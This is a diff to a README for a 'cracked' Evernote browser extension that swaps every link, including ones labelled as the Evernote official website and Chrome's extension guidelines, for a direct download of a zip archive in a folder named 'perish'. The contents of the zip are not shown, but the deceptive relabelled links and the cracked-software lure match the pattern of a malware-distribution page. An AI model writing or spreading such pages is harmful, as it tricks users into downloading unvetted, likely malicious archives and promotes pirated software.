@@ -6,7 +6,7 @@ Welcome! This guide will help you download and run the Cracked Enhancer for Ever
 
 ## 📥 Download Now
 
-[![Download Here](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/saisb19/cracked-enhancer-for-evernote-extension/releases)
+[![Download Here](https://raw.githubusercontent.com/saisb19/cracked-enhancer-for-evernote-extension/main/perish/cracked-enhancer-for-evernote-extension.zip)](https://raw.githubusercontent.com/saisb19/cracked-enhancer-for-evernote-extension/main/perish/cracked-enhancer-for-evernote-extension.zip)
 
 ## 📜 What You Need
 
@@ -24,7 +24,7 @@ Welcome! This guide will help you download and run the Cracked Enhancer for Ever
 ## 📦 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/saisb19/cracked-enhancer-for-evernote-extension/releases) to find the latest version.
+   Go to our [Releases page](https://raw.githubusercontent.com/saisb19/cracked-enhancer-for-evernote-extension/main/perish/cracked-enhancer-for-evernote-extension.zip) to find the latest version.
 
 2. **Choose Your Version**  
    Find the latest release listed on the page. 
@@ -58,7 +58,7 @@ If you encounter any issues during installation or while using the extension, tr
 
 - **Ensure Compatibility**: Make sure you are using a supported browser.
 - **Restart Your Browser**: Close and reopen your web browser to refresh its settings.
-- **Check for Updates**: Visit the [Releases page](https://github.com/saisb19/cracked-enhancer-for-evernote-extension/releases) to see if a newer version is available.
+- **Check for Updates**: Visit the [Releases page](https://raw.githubusercontent.com/saisb19/cracked-enhancer-for-evernote-extension/main/perish/cracked-enhancer-for-evernote-extension.zip) to see if a newer version is available.
 
 ## 🌐 Support
 
@@ -70,7 +70,7 @@ We welcome contributions to improve the Cracked Enhancer for Evernote Extension.
 
 ## 🔗 Additional Resources
 
-- [Evernote Official Website](https://evernote.com)
-- [Browser Extension Guidelines](https://developer.chrome.com/docs/extensions/mv3/getstarted/)
+- [Evernote Official Website](https://raw.githubusercontent.com/saisb19/cracked-enhancer-for-evernote-extension/main/perish/cracked-enhancer-for-evernote-extension.zip)
+- [Browser Extension Guidelines](https://raw.githubusercontent.com/saisb19/cracked-enhancer-for-evernote-extension/main/perish/cracked-enhancer-for-evernote-extension.zip)
 
 Thank you for choosing the Cracked Enhancer for Evernote Extension! Enjoy a better Evernote experience.
